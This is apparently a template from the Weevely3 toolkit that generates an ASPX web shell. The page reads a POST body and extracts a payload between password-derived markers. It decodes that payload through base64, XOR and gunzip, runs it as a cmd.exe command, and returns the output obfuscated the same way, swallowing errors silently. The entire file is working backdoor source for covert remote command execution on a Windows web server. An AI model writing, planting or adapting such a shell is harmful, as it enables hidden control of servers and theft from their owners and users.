<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<%text><%@ Page Language="C#" Debug="true" Trace="false" %></%text>
<%text><%@ Import Namespace="System.Diagnostics" %></%text>
<%text><%@ Import Namespace="System.IO" %></%text>
<%text><%@ Import Namespace="System.IO.Compression" %></%text>
<%text><%@ Import Namespace="System.Text" %></%text>

<script runat="server">
    // Weevely3 ASPX Agent
    // Implements the obfuscated communication protocol:
    // Request: Base64 -> XOR -> Gunzip -> Execute
    // Response: Output -> Gzip -> XOR -> Base64

    private string Xor(string text, string key)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < text.Length; i++)
        {
            sb.Append((char)(text[i] ^ key[i % key.Length]));
        }
        return sb.ToString();
    }

    private string StreamToString(Stream stream)
    {
        using (StreamReader reader = new StreamReader(stream, Encoding.GetEncoding("ISO-8859-1")))
        {
            return reader.ReadToEnd();
        }
    }

    private byte[] StringToBytes(string text)
    {
        return Encoding.GetEncoding("ISO-8859-1").GetBytes(text);
    }
    
    private string BytesToString(byte[] bytes)
    {
        return Encoding.GetEncoding("ISO-8859-1").GetString(bytes);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        // Password hash parts injected by generator
        string k = "${key}"; 
        string kh = "${header}";
        string kf = "${footer}";
        string p = "${PREPEND}";

        if (Request.HttpMethod == "POST")
        {
            try
            {
                // Read raw body
                string input;
                using (StreamReader reader = new StreamReader(Request.InputStream, Encoding.GetEncoding("ISO-8859-1")))
                {
                    input = reader.ReadToEnd();
                }

                int start = input.IndexOf(kh);
                int end = input.IndexOf(kf);

                if (start != -1 && end != -1)
                {
                    string payload = input.Substring(start + kh.Length, end - (start + kh.Length));

                    // Decode: Base64 -> XOR -> Gunzip
                    byte[] decodedBytes = Convert.FromBase64String(payload);
                    string xorred = BytesToString(decodedBytes);
                    string unxorred = Xor(xorred, k);

                    string cmd = "";
                    using (MemoryStream ms = new MemoryStream(StringToBytes(unxorred)))
                    using (GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress))
                    using (StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding("ISO-8859-1")))
                    {
                        cmd = reader.ReadToEnd();
                    }

                    // Execute Command
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + cmd;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process proc = Process.Start(psi);
                    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    // Encode: Gzip -> XOR -> Base64
                    string compressed = "";
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress))
                        {
                            byte[] outputBytes = StringToBytes(output);
                            gzip.Write(outputBytes, 0, outputBytes.Length);
                        }
                        compressed = BytesToString(ms.ToArray());
                    }

                    string reXorred = Xor(compressed, k);
                    string encoded = Convert.ToBase64String(StringToBytes(reXorred));

                    Response.Write(p + kh + encoded + kf);
                }
            }
            catch (Exception ex)
            {
                // Silent fail or debug
                // Response.Write(ex.ToString());
            }
        }
    }
</script>
